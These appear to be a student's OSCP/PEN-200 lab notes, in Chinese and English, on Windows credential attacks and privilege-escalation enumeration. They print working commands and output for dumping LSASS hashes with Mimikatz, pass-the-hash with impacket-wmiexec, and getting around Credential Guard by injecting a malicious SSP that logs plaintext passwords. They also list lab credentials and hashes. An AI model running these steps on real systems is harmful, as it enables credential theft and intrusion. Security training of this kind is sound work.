---
title: '[OSCP, PEN-200] Instructional notes - Part 3'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 3
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 2](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md) 內容


# Password Attacks
## Working with Password Hashes
### ... [(Instructional notes - Part 2)](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#working-with-password-hashes)
### Windows Credential Guard
以上皆處理了屬於本機帳戶的雜湊值，若遇到其他類型的帳號 (ex. [Windows domain](https://en.wikipedia.org/wiki/Windows_domain) accounts)，取得 hash 便能進行爆破或是 pass-the-hash attack

>[!Important]
>domain hashes 相較於 local account hashes 不同:
>- local account hashes 儲存在 SAM 中
>- domain hashes 儲存在 memory 的 lsass.exe process

Mimikatz 可以識別這些儲存的憑證
前提： 以 Administrator 身份（or higher）運行並 啟用SeDebugPrivilege 存取權限

#### 1. 登入 RDP 留下 domain user's information
- SERVERWK248: 192.168.145.248
    > Administrator / QWERTY123!@#
- CLIENTWK246: 192.168.145.246
    > offsec / lab
- CLIENTWK245: 192.168.145.245
    > offsec / lab

以下範例以 CORP\Administrator 使用者身分 (pwd: QWERTY!@#2/）) 登入 RDP 進入 CLIENTWK246:
```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.145.246 /dynamic-resolution
[00:19:01:640] [769709:769710] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
```
> 當成功連線時， LSASS 已在 memory 中快取了網域用戶的資訊
>> 接著「登出」
>> 使用 本機管理員 offsec 的身分重新登入

```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ xfreerdp /u:"offsec" /p:"lab" /v:192.168.145.246 /dynamic-resolution
```
![image](https://hackmd.io/_uploads/SkGXbLe91g.png)

#### 2. 登入 local administrator 執行 Mimikatz
```
PS C:\> cd .\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2452263 (00000000:00256b27)
Session           : RemoteInteractive from 3
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
Logon Time        : 2/16/2025 10:42:00 PM
SID               : S-1-5-21-180219712-1214652076-1814130762-1002
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : CLIENTWK246
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
         * DPAPI    : a188967ac5edb88eca3301f93f756ca8
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : offsec
         * Domain   : CLIENTWK246
         * Password : (null)
        ssp :
        credman :
        cloudap :

...

Authentication Id : 0 ; 1173179 (00000000:0011e6bb)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 2/16/2025 10:40:09 PM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
         * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
        wdigest :       KO
        kerberos :
         * Username : Administrator
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

...
mimikatz #
```
> `sekurlsa::logonpasswords`: dump all available credentials\
> domain user 不會存在 SAM, 因此不會使用 `lsadump::sam`\
> (可參見: [#Cracking NTLM 2.3](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#23-%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A2%BC%E5%92%8C%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A))


以上透過 Mimikatz 取得本機 offsec 使用者的憑證資訊，也從 CORP.COM domain 中獲得管理員使用者的資訊：
```
User Name         : offsec
Domain            : CLIENTWK246
Logon Server      : CLIENTWK246
...
* NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e

User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
...
* NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
```

#### 3. 將取得的 credentials 利用 pass-the-hash attack
可以利用以上 Administrator 資訊， 透過 pass-the-hash attack 存取 SERVERWK248 (192.168.145.248) 
```
┌──(chw㉿CHW)-[~]
└─$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.145.248
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] SMBv3.0 dialect used
[+] Target system is 192.168.145.248 and isFQDN is False
[+] StringBinding: SERVERWK248[57267]
[+] StringBinding: 192.168.145.248[57267]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.145.248[57267]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
corp\administrator
```

>[!Warning]
>微軟為了強化安全性，引入 
>1. [VBS](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)（Virtualization-Based Security):\
>VBS 是微軟利用 CPU virtualization, 建立和隔離記憶體的安全區域: [Virtual Secure Mode](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm) (VSM)
>VBS runs a [hypervisor](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor) on the physical hardware rather than running on the operating system.
> 2. VSM 透過 [Virtual Trust Levels](https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf)(VTLs) 來維持這種隔離，目前 Microsoft 支援最多 16 個級別
> 
> 3. VBS 內部的 Virtual Trust Levels（VTL，虛擬信任層）
>- **VTL0 (VSM Normal Mode)**: 執行普通的 Windows 環境（一般應用程式、使用者模式與核心模式）。
>- **VTL1 (VSM Secure Mode)**: Windows 安全機制，存放 LSASS（本機安全驗證系統） 的關鍵資料，例如密碼雜湊與憑證。
>
>user-mode in VTL1: [Isolated User-Mode (IUM)](https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes)處理 Trusted Processes, Secure Processes 或 Trustlets

以上 features 皆是在 Windows 10 和 Windows Server 2016 首次推出，預設皆為 Disable。所以在大多企業都沒有啟用。

>[!Important]
>Credential Guard 的影響:\
>一般情況下，Mimikatz 可以從 `lsass.exe` 記憶體中截取明文密碼或 NTLM 雜湊。\
>Credential Guard 啟用時，敏感資料都存放在 VTL1 的 LSAISO.exe，即使拿到 SYSTEM 權限，也無法存取這些資訊。(Mimikatz 只能讀取 LSASS process)

#### 確認是否運行 Credential Guard
```
PS C:\Users\offsec> Get-ComputerInfo

WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Enterprise
...
HyperVisorPresent                                       : True
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
```
> DeviceGuardSecurityServicesRunning下啟用的措施之一是`CredentialGuard`。

#### Credential Guard 啟用下使用 Mimikatz
```
PS C:\Users\offsec> cd C:\tools\mimikatz\
PS C:\tools\mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 4214404 (00000000:00404e84)
Session           : RemoteInteractive from 4
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 4:39:07 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
           * LSA Isolated Data: NtlmHash
             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
        tspkg :
```

> 在同樣成功登入 domain CORP.COM 的情況下，無法取得 cached hashes

#### 如何繞過 Credential Guard
Windows 提供了多種身份[驗證機制](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10))，例如：\
- LSA（Local Security Authority，當地安全機構）
- Winlogon（Windows 登入程序）
- SSPI（Security Support Provider Interface，安全支援提供者介面）

其中 SSPI 是 Windows 認證的基礎機制，所有需要身份驗證的應用程式和服務都會透過 SSPI 進行身份驗證。Windows 預設提供多種 Security Support Providers（SSP，安全支援提供者），如：
- Kerberos SSP（負責 Kerberos 驗證）
- NTLM SSP（負責 NTLM 驗證）
這些 SSP 都是以 DLL 檔案存在，每當進行身份驗證時，SSPI 會決定要使用哪一個 SSP 來處理請求。

#### 攻擊手法
Windows 允許透過 AddSecurityPackage API 或 修改登錄檔 來新增自訂的 SSP：

登錄路徑：`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages`\
每次系統開機時，LSASS 皆會讀取這個登錄鍵中的所有 SSP，並將對應的 DLL 載入到記憶體中。\
**這代表如果我們開發一個惡意 SSP 並將其註冊到 LSASS，就可以讓 Windows 透過我們的 SSP 來處理身份驗證，從而攔截並取得使用者的明文密碼。**

>[!Important]
>Mimikatz 已經內建這種攻擊方式，透過 `memssp` 來實作。
memssp 的特點：\
- 不會在磁碟上留下 DLL 檔案，直接注入記憶體（避免被防毒軟體偵測）。
- 攔截所有經過 SSPI 的身份驗證請求，並記錄明文密碼到 `C:\Windows\System32\mimilsa.log`。

Mimikatz 注入惡意 SSP
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)
```
在惡意 SSP 注入後，
1. 等待另一個使用者遠端連接到機器
2. 社交工程

(透過手動登入)
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.145.245 /dynamic-resolution
```
透過 RDP 成功驗證機器身分後，登出。\
再以本機管理員(offsec) 登入 CLIENTWK245 ，調查惡意 SSP 的結果。
驗證 Mimikatz 注入 SSP 到 LSASS時，憑證將會保存在日誌檔案    `C:\Windows\System32\mimilsa.log`。
```
PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
[00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
[00000000:00404e84] CORP\Administrator  Šd
[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?
```
> CORP\Administrator  QWERTY123!@#

# Windows Privilege Escalation

## Enumerating Windows
First need to get familiar with the Windows privilege structure and access control mechanisms.
### Understanding Windows Privileges and Access Control Mechanisms
#### 1. [Security Identifier](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) (SID) 
Windows uses a SID to identify entities. SID 是獨立的 value，會分配給每個 entity 或 principa，讓 Windows 識別 users 和 groups。
-  [Local Security Authority](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)(LSA): 產生 local accounts and groups
- Domain Controller (DC): 產生 domain users and domain groups
>[!Tip]
> Windows uses only the SID, not usernames, to identify principals for access control management.

SID 格式：`S`、`R`、`X` 和 `Y` 表示
```
S-R-X-Y
```
> `S`：固定，表示是一個 SID。\
`R`（Revision）：SID 版本，目前固定為 1。\
`X`（Identifier Authority）：表示識別碼的發行機構，5（NT Authority）：最常見，表示本機或網域中的使用者和群組。\
`Y`（Sub Authorities）：細分權限的識別碼，包含：
>- 網域識別碼（Domain Identifier）：對於本機使用者，這是該機器的識別碼；對於網域使用者，則是網域的識別碼。
>- 相對識別碼（RID, Relative Identifier）：用來區分個別使用者或群組。

```
PS C:\> whoami /user

USER INFORMATION
----------------

User Name        SID
================ ==============================================
chw-macbook\cwei S-1-5-21-1336799502-1441772794-948155058-1001
```
> `S-1-5`：表示 NT Authority。\
`21-1336799502-1441772794-948155058`：這部分是網域或本機識別碼。\
`1001`（RID）：表示這是該系統上的第二個本機使用者（第一個通常是 1000）。


[well-known SIDs](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) ( RID under 1000 ):
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

#### 2. [access token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
>[!Tip]
>The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token.

- Primary Token：
由 登入的使用者 擁有，會附加到該使用者啟動的任何 Process 或 Thread，目的是為了定義每個 object 之間的 permissions。
例如: 當使用者開啟 cmd.exe，該命令提示字元的 process 會擁有該使用者的 Primary Token。
- Impersonation Token：
允許 Thread 使用不同於其 process 的權限來存取物件。
例如: 當某個程式需要以 不同使用者的身分 執行時，可能會使用 Impersonation Token。

#### 3. [Mandatory Integrity Control](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)

除了 SID 和 Token 之外，Windows 透過 [Integrity Level](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) 來進一步限制存取權限，這個機制可以防止 **低權限的應用程式影響高權限的應用程式**。

From Windows Vista onward, processes run on five integrity levels:
```
- System integrity – Kernel-mode processes with SYSTEM privileges
- High integrity – Processes with administrative privileges
- Medium integrity – Processes running with standard user privileges
- Low integrity level – Restricted processes, often used for security   [sandboxing](https://en.wikipedia.org/wiki/Sandbox_(software_development)), such as web browsers.
- Untrusted – The lowest integrity level, assigned to highly restricted processes that pose potential security risks
```
[Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) 可以檢查 process integrity levels

![image](https://hackmd.io/_uploads/SJwrBog9kx.png)
> 圖中皆執行 Powershell，可以推斷出 High integrity level process 是由 administrative user 啟動的，而 Medium integrity level process  是由 regular user 啟動的

#### 4. [User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview)
為了保護 operating system，即使使用者是 Administrator，執行時仍會預設以標準使用者權限運行，降低系統被攻擊的風險。 

當管理員帳戶登入 Windows 時，系統會分配 兩個 Access Tokens：
- Filtered Admin Token (standard user token)：
預設使用的 Token ，所有應用程式和操作都以標準使用者權限運行，不能直接修改系統關鍵檔案或 Registry。
- Administrator Token：
只有在需要提升權限時才會使用，例如修改系統設定或安裝軟體。
(會跳出 [UAC consent prompt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 視窗，需手動確認)

From Windows Vista onward, processes run on four integrity levels:
```
System integrity – Kernel-mode processes with SYSTEM privileges
High integrity – Administrative processes
Medium integrity – Standard user processes
Low integrity – Restricted processes, commonly used for sandboxing (e.g., web browsers)
```

### Situational Awareness
key pieces of information:
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

以下 nc CLIENTWK220 system bind shell 為例：
#### - whoami
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.187.220 4444
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>whoami
whoami
clientwk220\dave
```
> 顯示的 hostname `clientwk220`，可以知道機器是 client system 不是 Server
> > 若是 Server 或 AD: `server01\administrator`, `dc01\administrator`

#### - whoami /groups
```
C:\Users\dave>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID                                            Attributes                                        
==================================== ================ ============================================== ==================================================
Everyone                             Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
CLIENTWK220\helpdesk                 Alias            S-1-5-21-2309961351-4093026482-2223492918-1008 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
> 1. dave 是 `helpdesk group` 的成員，Helpdesk staff 通常會有其他存取權限
> 2. `BUILTIN\Remote Desktop` Users，可能會有權限連接 RDP 到系統
> 3. 其他皆是 non-privileged users 的 standard (ex. `Everyone`, `BUILTIN\Users`)

#### - net user / Get-LocalUser
>[!Note]
> - `net user`: 列出 Local user，若在網域環境中執行，會顯示 domain user，只會列出 account name ，不包含其他詳細資訊，如帳號啟用狀態或描述
> - `Get-LocalUser`: 列出本機帳號，並顯示帳號啟用狀態、描述等詳細資訊

```
C:\Users\dave>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> net user
net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave                     
daveadmin                DefaultAccount           Guest                    
offsec                   steve                    WDAGUtilityAccount       
The command completed successfully.

PS C:\Users\dave> Get-LocalUser
Get-LocalUser

Name               Enabled Description                                                                                 
----               ------- -----------                                                                                 
Administrator      False   Built-in account for administering the computer/domain                                      
BackupAdmin        True                                                                                                
dave               True    dave                                                                                        
daveadmin          True                                                                                                
DefaultAccount     False   A user account managed by the system.                                                       
Guest              False   Built-in account for guest access to the computer/domain                                    
offsec             True                                                                                                
steve              True                                                                                                
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
```
> 1. Administrator 帳號被停用
> 2. steve 與 dave 是一般用戶
> 3. (名稱猜測) daveadmin 與 BackupAdmin，可能有 amdin 的價值
> 4. Administrators 通常會有 non-privileged 和 privileged 的帳號權限 
> 
> `net user` 與 `Get-LocalUser` 顯示結果數量相同，也能猜測這台機器沒有 AD

#### - net localgroup / Get-LocalGroup
>[!Note]
> `Get-LocalGroup`: 多顯示每個 Group 的用途
```
PS C:\Users\dave> net localgroup
net localgroup

Aliases for \\CLIENTWK220

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*adminteam
*Backup Operators
*BackupUsers
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*helpdesk
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.

PS C:\Users\dave> Get-LocalGroup
Get-LocalGroup

Name                                Description                                                                        
----                                -----------                                                                        
adminteam                           Members of this group are admins to all workstations on the second floor           
BackupUsers                                                                                                            
helpdesk                                                   
...
Administrators                      Administrators have complete and unrestricted access to the computer/domain     
...
Remote Desktop Users                Members in this group are granted the right to logon remotely                      
Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
...
Users                               Users are prevented from making accidental or intentional system-wide changes an...

PS C:\Users\dave> 
```
> 1. group name BackupUsers 可能跟 user BackupAdmin 有關，另外 Backup 可能會有 file system 權限
> 2. `Administrators`, `adminteam`, `Backup Operators`, `Remote Desktop Users`, and `Remote Management Users` 可以繼續分析的 Group

```
PS C:\Users\dave> Get-LocalGroupMember adminteam
Get-LocalGroupMember adminteam

ObjectClass Name                PrincipalSource
----------- ----                ---------------
User        CLIENTWK220\daveadmin Local 

PS C:\Users\dave> Get-LocalGroupMember Administrators
Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local          
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin     Local  
User        CLIENTWK220\offsec        Local
```
> 只有 daveadmin 在 adminteam group
> > daveadmin 既是 adminteam 成員，又是 Administrators
> > 另外，adminteam 不在 Administrators Group，所以不是管理者權限。
>
> 除了 local Administrator account 被停用，daveadmin, BackupAdmin 和 offsec 也是 Administrator group。

查看 RDP 與 Remote Management
```
PS C:\Users\dave> Get-LocalGroupMember "Remote Desktop Users"
Get-LocalGroupMember "Remote Desktop Users"

ObjectClass Name              PrincipalSource
----------- ----              ---------------
User        CLIENTWK220\dave  Local          
User        CLIENTWK220\steve Local          


PS C:\Users\dave> Get-LocalGroupMember "Remote Management Users" 
Get-LocalGroupMember "Remote Management Users"

ObjectClass Name                  PrincipalSource
----------- ----                  ---------------
User        CLIENTWK220\daveadmin Local          
User        CLIENTWK220\steve     Local
```

#### - systeminfo
收集系統資料
```
PS C:\Users\dave> systeminfo
systeminfo

Host Name:                 CLIENTWK220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22621 N/A Build 22621
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec
...
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
...

```
> Windows 11 Pro system ([現有版本](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)識別): `build 22621 is the version 22H2 of Windows 11`\
> x64-based PC: 64-bit system


#### - ipconfig
```
PS C:\Users\dave> ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : clientwk220
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-C8-13
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::7e7:95d:5d0:aa99%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.187.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.187.254
   DHCPv6 IAID . . . . . . . . . . . : 234901590
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2E-83-35-C9-00-50-56-AB-9D-6F
   DNS Servers . . . . . . . . . . . : 192.168.187.254
   NetBIOS over Tcpip. . . . . . . . : Enabled
```
> 沒有設定 [Dynamic_Host_Configuration_Protocol](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol) (DHCP)，手動設定 IP
> DNS server, gateway, subnet mask, and MAC address.

#### - route print
顯示 routing table，可以增加我們的攻擊面
```
PS C:\Users\dave> route print
route print
===========================================================================
Interface List
  4...00 50 56 ab c8 13 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.187.254  192.168.187.220     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.187.0    255.255.255.0         On-link   192.168.187.220    271
  192.168.187.220  255.255.255.255         On-link   192.168.187.220    271
  192.168.187.255  255.255.255.255         On-link   192.168.187.220    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.187.220    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.187.220    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.187.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    271 fe80::/64                On-link
  4    271 fe80::7e7:95d:5d0:aa99/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
> `vmxnet3 Ethernet Adapter`：代表是一台 VMware 虛擬機 (已知訊息)

#### - netstat
list all active network connections
```
PS C:\Users\dave> netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3340
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1016
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3340
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3508
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1148
